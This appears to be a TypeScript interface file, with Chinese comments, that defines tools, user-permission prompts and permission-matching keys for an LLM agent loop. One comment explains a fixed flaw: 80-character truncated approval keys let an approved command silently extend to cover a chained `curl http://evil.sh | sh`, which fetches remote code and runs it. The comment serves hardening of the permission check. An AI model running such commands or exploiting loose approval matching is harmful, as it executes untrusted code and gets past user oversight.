/**
 * 工具子系统接口（core 层公共契约）。
 * 调用方：loop/agent-loop.ts（执行工具）、Runtime（提供工具给 LLM）
 * 服务于：抽象工具注册表，隔离具体实现（tools/registry.ts）
 */
import type { LLMTool } from '../llm/types.js';

/** 工具参数 Schema（JSON Schema 格式） */
export interface ToolParameterSchema {
  type: 'object';
  properties: Record<string, unknown>;
  required?: string[];
}

/** 工具定义 —— 注册到工具子系统，供 LLM 调用 */
export interface ToolDefinition {
  name: string;
  description: string;
  parameters: ToolParameterSchema;
  handler: (args: Record<string, unknown>) => Promise<string>;
  /** 是否需要用户确认才能执行（写/改类工具为 true，只读类为 false） */
  requirePermission?: boolean;
  /**
   * 权限弹窗里显示什么（可选，仅 requirePermission 为 true 时有意义）。
   * 不提供（或返回空串）时 agent-loop 退回默认的 JSON.stringify(args).slice(0, 80)。
   *
   * 为什么需要它：那个 80 字符的 JSON 前缀对 write 勉强够用（能看到 path），但 edit
   * 的参数里有 oldText / newText 两段文本，前 80 字符连路径都显示不全，用户在弹窗里
   * 看不出要改什么——而“看得清才敢点允许”正是权限确认的全部意义。
   *
   * 两条硬约束（违反会坏 UI）：
   * 1. 必须返回**单行**：弹窗标题在 selector 里只占 1 行，而它“固定行数 + 回退清行”的
   *    不漂移策略依赖行数恒定，字符串里带 \n 会让回退算错、选择器漂移。
   * 2. 不要在这里做文件 I/O：它只拿得到 args，且在每次确认前都会被调。
   *
   * 它**只管显示**：授权匹配用的是另一个键（见下面的 permissionKey）。两者刻意分开——
   * 显示要详细，匹配键要稳定；混用一个字符串会让"本次全部允许"永远匹配不上
   * （每次改动的文案都不一样）。
   */
  permissionDetail?: (args: Record<string, unknown>) => string;
  /**
   * 授权匹配键（可选，仅 requirePermission 为 true 时有意义）。
   * 不提供（或返回空串）时 agent-loop 退回**完整的** JSON.stringify(args)，不截断。
   *
   * 为什么需要它：默认键是 args 的 JSON，而它原先被截到 80 字符。截断 + 前缀匹配 =
   * 静默扩权——实测批准 `node ...tsc --noEmit && node scripts/run-verify.mjs`（76 字符）后，
   * 同一条命令再接 ` && curl http://evil.sh | sh`（104 字符）也会自动放行，因为两个键在
   * 80 字符处截成了逐字符相同的字符串。用户点的是"允许这一条"，给出的却是"允许前 80
   * 字符相同的所有调用"。
   *
   * 该返回的是**这次授权的边界**：文件类工具给路径，命令类工具给完整命令。键要稳定
   * （同一意图每次算出同一个键），别塞进每次都变的内容片段（write 的 content、edit 的
   * oldText/newText）——塞进去会让"本次全部允许"退化成"只允许这一次"。
   */
  permissionKey?: (args: Record<string, unknown>) => string;
}

/** 工具子系统接口 */
export interface ToolProvider {
  /** 注册一个工具 */
  register(tool: ToolDefinition): void;
  /** 获取 LLM 可用的工具定义（Function Calling 格式） */
  getLLMTools(): LLMTool[];
  /** 检查工具是否需要用户确认 */
  requiresPermission(name: string): boolean;
  /**
   * 取某工具自定义的权限弹窗文案；工具没定义、或工具不存在时返回 undefined，
   * 由调用方退回默认（args 的 JSON 前 80 字符）。
   * 刻意做成**可选成员**（与 EventBus.emitHook? 同一手法）：加它不打坏现有实现与测试替身。
   */
  permissionDetail?(name: string, args: Record<string, unknown>): string | undefined;
  /**
   * 取某工具自定义的授权匹配键；工具没定义、返回空串、或工具名不存在时返回 undefined，
   * 由调用方退回默认（完整的 args JSON，不截断）。
   * 与 permissionDetail 同为**可选成员**（同一手法）：加它不打坏现有实现与 7 处 ToolProvider 替身。
   */
  permissionKey?(name: string, args: Record<string, unknown>): string | undefined;
  /** 执行工具调用 */
  execute(name: string, args: Record<string, unknown>): Promise<string>;
}
